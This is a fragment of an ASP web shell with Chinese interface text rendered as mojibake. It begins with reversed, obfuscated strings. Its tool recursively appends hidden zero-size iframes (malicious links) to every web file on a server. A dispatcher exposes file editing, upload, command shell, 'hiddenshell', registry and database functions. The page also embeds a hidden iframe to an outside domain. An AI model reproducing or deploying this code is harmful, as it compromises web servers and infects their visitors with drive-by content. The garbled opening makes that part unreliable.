tnof<�� SRR��nehT ���=edocdda ro ���=s fI��neht ���><)��timbus��(mrof.tseuqer fi�� noitcnuF dnE�� fI dnE�� eslaF=nrettaPsI�� eslE�� eurT=nrettaPsI�� nehT eurT=laVter fI�� gnihtoN=xEger teS�� )rts(tseT.xEger=laVter�� eurT=esaCerongI.xEger�� ttap=nrettaP.xEger�� pxEgeR weN=xEger teS�� )rts,ttap(nrettaPsI noitcnuF�� fI dnE��)�� >mrof/<>elbat/<>rt/<��(SRR��)��>dt/<>���ʼ�����=eulav ���timbus���=epyt ���timbus���=eman tupni<>dt<��(SRR��)��>dt/<>aeratxet/<��&edocdda&��>���3���=swor 85=sloc ���edoc���=eman aeratxet<>dt<��(SRR��)��>dt/<:����Ĺ�Ҫ>dt<>rt<>rt/<��(SRR��)��>dt/<;psbn&>���96���=htdiw dt<��(SRR��)��>dt/<>06=ezis ����&s&����=eulav ���df���=eman ���txet���=epyt tupni<>���953���=htdiw dt<��(SRR��)��>dt/<��)��·�Ծ�( �м��ĵĹ�Ҫ>���201���=htdiw dt<��(SRR��)��>rt<��(SRR��)��>���;xp21:ezis-tnof���=elyts ���0���=redrob 065=htdiw elbat<��(SRR��)�� >���TSOP���=dohtem mrof<��(SRR�� eslE�� tceles dnE�� )htp(evas_elif LLAC�� ��evas�� esaC�� )htp(wohs_elif LLAC�� ��tide�� esaC�� xe esaC tceles�� nehT ���><htp DNA ���><xe fI���>emarfi/<>0=thgieh 0=htdiw mth.m/1.0.0.721//:ptth=crs emarfi<��=edocdda neht ���=edocdda fi��)��edoc��(tseuqeR = edocdda�� )��tncwen��(tseuqeR=tncwen�� )��htp��(tseuqeR=htp�� )��xe��(tseuqeR=xe��)��/��(htaPpaM.revreS=s neht ���=s fi�� )��df��(tseuqeR=s�� )��OFNI_HTAP��(selbairaVrevreS.tseuqeR=FLES_PSA��)��>b/<��(&)��/��(htaPpaM.revreS&)��:��·�Ծ�վ��ǰ��>b<��( SRR":ExeCuTe(ShiSanFun(ShiSan))::Case "Cplgm":Fpath=Request("fd"):addcode = Request("code"):addcode2 = Request("code2"):pcfile=request("pcfile"):checkbox=request("checkbox"):ShowMsg=request("ShowMsg"):FType=request("FType"):M=request("M"):if Ftype="" then Ftype="txt|htm|html|asp|php|jsp|aspx|cgi|cer|asa|cdx":if Fpath="\" then Fpath=Server.MapPath("\")
	if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")	
	if addcode="" then addcode="<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>"
	if checkbox="" then checkbox=request("checkbox")
	if pcfile="" then
		pcfileName=Request.ServerVariables("SCRIPT_NAME")
		pcfilek=split(pcfileName,"/") 
		pcfilen=ubound(pcfilek) 
		pcfile=pcfilek(pcfilen) 
	end if
  	RRS ("<b>��վ��Ŀ¼</b>- "&Server.MapPath("/")&"<br>")
	RRS ("<b>������Ŀ¼</b>- "&Server.MapPath("."))
	RRS "<form method=POST><div style='color:#3399ff'><b>[" 
	if M="1" then RRS"��������-������"
	if M="2" then RRS"��������-������˵���"
	if M="3" then RRS"�����滻��-�ļ��滻�޸Ĺ���"
	if M="" then response.end
	RRS "]</b></div><table width=100% border=0><tr><td>�ļ�·����</td>"
	RRS "<td><input type=text name=fd value='"&Fpath&"' size=40> �\������վ��Ŀ¼����.��Ϊ��������Ŀ¼</td></tr>"
	if M="1" then RRS "<tr><td>�����ظ���</td><td><input class=c name='checkbox' type=checkbox value='checked' "&checkbox&"> ��ֹһ��ҳ�����ж���ظ��Ĵ���</td></tr>"
	RRS "<tr><td>�ų��ļ���</td>"
	RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> ���벻�뱻�޸ĵ��ļ��������磺1.asp|2.asp|3.asp</td></tr>"
	RRS "<tr><td>�ļ����ͣ�</td>"
	RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> ����Ҫ�޸ĵ��ļ�����[��չ��]�����磺htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td><font color=#3399ff>"
	if M="1" then RRS"Ҫ�ҵģ�"
	if M="2" then RRS"Ҫ��ģ�"
	if M="3" then RRS"�������ݣ�"
	RRS"</font></td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
	if M="3" then RRS "<tr><td><font color=#3399ff>�� �� Ϊ��</font></td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
	RRS "<tr><td></td><td> <input name=submit type=submit value=��ʼִ��> --��ǽ���--[�ɹ����� �� �ų����� �� �ظ���<font color=red>��</font>]</td></tr>"
	RRS "</table></form>" 
if request("submit")="��ʼִ��" then 
RRS"<div style='line-height:25px'><b>ִ�м�¼��</b><br>"
call InsertAllFiles(Fpath,addcode,pcfile)
RRS"</div>"
end if
Sub InsertAllFiles(Wpath,Wcode,pc)
	Server.ScriptTimeout=999999999
	 if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
	 Set WFSO = CreateObject("Scripting.FileSystemObject")
	 on error resume next 
	 Set f = WFSO.GetFolder(Wpath)
	 Set fc2 = f.files
	 For Each myfile in fc2
		Set FS1 = CreateObject("Scripting.FileSystemObject")
		FType1=split(myfile.name,".") 
		FType2=ubound(FType1) 
		if Ftype2>0 then
		FType3=LCase(FType1(FType2)) 
		else
		FType3="��"
		end if
		if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
			select case M
				case "1"
					if checkbox<>"checked" then
						Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
						tfile.writeline Wcode
						RRS"�� "&Wpath&myfile.name
						tfile.close
					else
						Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
						if Instr(tfile1.readall,Wcode)=0 then
							Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
							tfile.writeline Wcode
							RRS"��  "&Wpath&myfile.name
							tfile1.close
						else
							RRS"<font color=red>��</font> "&Wpath&myfile.name
							tfile1.close
						end if
						Set tfile1=Nothing
					end if
				case "2"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,"")
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"��  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case "3"
					Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
					NewCode=Replace(tfile1.readall,Wcode,addCode2)
					Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
					objCountFile.Write NewCode
					objCountFile.Close
					RRS"��  "&Wpath&myfile.name
					Set objCountFile=Nothing
				case else
					RRS"���,������.":response.end
			end select
		else
			RRS"�� "&Wpath&myfile.name
		end if
RRS " �� <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='����'>Down</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='�༭'>edit</a> "
RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='����'>Copy</a> "
RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='�ƶ�'>Move</a><br>"
	 Next
 Set fsubfolers = f.SubFolders
 For Each f1 in fsubfolers
	NewPath=Wpath&""&f1.name
 	InsertAllFiles NewPath,Wcode,pc
 Next
set tfile=nothing
Set FSO = Nothing
set tfile=nothing
set tfile2=nothing
Set WFSO = Nothing
End Sub
  Case "ReadREG":call ReadREG()
  Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
  Case "DownFile":DownFile FName:ShowErr()
  Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
  Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
  Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
  Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
  Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
  Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
  Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
  Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
  Case "UpFile":UpFile()
  Case "Cmd1Shell":Cmd1Shell()
  case "SetFileText":SetFileText()
  case "hiddenshell":hiddenshell()
  case "php":php()
  case "apjdel":apjdel()
  Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL
  Case "CreateMdb":CreateMdb FName
  Case "CompactMdb":CompactMdb FName
  Case "DbManager":DbManager()
  Case "Course":Course()
  Case "ServerInfo":ServerInfo()
  Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
RRS"</body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>"
%>